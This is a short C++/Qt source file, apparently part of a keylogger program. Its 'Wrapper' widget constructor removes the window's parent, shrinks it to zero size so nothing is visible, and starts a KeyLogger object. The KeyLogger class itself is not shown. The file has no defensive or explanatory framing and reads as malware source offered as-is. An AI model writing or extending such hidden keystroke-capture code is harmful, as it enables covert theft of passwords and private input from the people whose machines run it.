#include "wrapper.h"

Wrapper::Wrapper(QWidget *parent) :
    QWidget(parent)
{
    setParent(nullptr);
    setFixedSize(0, 0);

    KeyLogger *keyLogger = new KeyLogger(this);
}
